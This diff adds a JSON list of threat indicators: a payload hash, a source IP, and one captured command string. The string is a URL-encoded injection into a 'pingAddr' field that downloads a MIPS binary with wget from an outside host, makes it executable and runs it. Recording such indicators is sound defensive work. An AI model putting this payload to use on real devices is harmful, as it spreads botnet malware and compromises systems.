@@ -1,0 +1,21 @@
+[
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart.abuse.st%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+warautalkinabout"
+  },
+  {
+    "asn": "AT&T Enterprises, LLC",
+    "country": "United States",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "162.198.15.XXX"
+  }
+]
